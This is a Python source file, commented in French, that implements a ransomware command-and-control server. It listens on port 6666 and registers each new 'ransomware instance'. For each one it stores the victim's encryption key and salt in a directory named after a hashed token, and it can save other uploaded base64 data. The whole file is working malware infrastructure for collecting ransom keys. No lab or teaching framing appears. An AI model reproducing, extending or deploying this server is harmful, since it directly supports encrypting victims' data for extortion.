import base64
from hashlib import sha256
from http.server import HTTPServer
import os
from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_DIRECTORY = "/root/CNC"

    def save_base64_data(self, token: str, encoded_data: str, filename: str) -> None:
        """
        Sauvegarde les données encodées en base64 dans le répertoire correspondant au token.
        """
        binary_data = base64.b64decode(encoded_data)
        save_path = os.path.join(CNC.ROOT_DIRECTORY, token, filename)
        with open(save_path, "wb") as file:
            file.write(binary_data)

    def post_new(self, path: str, params: dict, body: dict) -> dict:
        """
        Enregistre une nouvelle instance de ransomware en créant un répertoire pour stocker la clé et le sel.
        """
        token_bytes = base64.b64decode(body["token"])
        salt_bytes = base64.b64decode(body["salt"])
        key_bytes = base64.b64decode(body["key"])

        hashed_token = sha256(token_bytes).hexdigest()
        directory_path = os.path.join(CNC.ROOT_DIRECTORY, hashed_token)
        os.makedirs(directory_path, exist_ok=True)

        # Sauvegarde du sel et de la clé dans des fichiers séparés
        with open(os.path.join(directory_path, "salt.bin"), "wb") as salt_file:
            salt_file.write(salt_bytes)

        with open(os.path.join(directory_path, "key.bin"), "wb") as key_file:
            key_file.write(key_bytes)

        return {"status": "Success", "message": f"Données enregistrées pour le token : {hashed_token}"}

# Démarrage du serveur HTTP
if __name__ == "__main__":
    httpd = HTTPServer(('0.0.0.0', 6666), CNC)
    httpd.serve_forever()
